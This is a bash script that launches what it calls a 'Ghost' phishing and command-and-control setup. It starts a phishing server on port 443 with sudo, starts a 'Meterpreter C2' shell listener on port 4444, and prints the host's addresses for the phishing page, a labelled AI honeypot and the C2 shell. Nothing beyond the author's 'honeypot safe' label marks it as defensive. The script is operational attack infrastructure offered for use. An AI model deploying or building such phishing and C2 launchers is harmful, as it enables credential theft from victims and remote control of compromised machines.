#!/bin/bash
# launch_ghost_only.sh — GHOST C2 + PHISHING (HONEYPOT SAFE)

echo "GHOST C2 + PHISHING — LAUNCHING (HONEYPOT SAFE)"

# === 1. KILL ONLY GHOST PROCESSES ===
pkill -f ghost_server.py 2>/dev/null
pkill -f c2_ghost.py 2>/dev/null
sleep 2

# === 2. START GHOST C2 + PHISHING (443) ===
echo "Starting Ghost C2 + Phishing (443)..."
sudo nohup python3 ghost_server.py > logs/ghost.log 2>&1 &
sleep 3

# === 3. START METERPRETER C2 (4444) ===
echo "Starting Meterpreter C2 (4444)..."
nohup python3 c2_ghost.py > logs/c2.log 2>&1 &
sleep 2

# === 4. SHOW STATUS ===
echo ""
echo "GHOST LIVE — HONEYPOT SAFE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Honeypot (AI): http://$(hostname -I | awk '{print $1}'):8080"
echo "Phishing:      https://$(hostname -I | awk '{print $1}')"
echo "C2 Shell:      Port 4444"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Logs: tail -f logs/ghost.log"
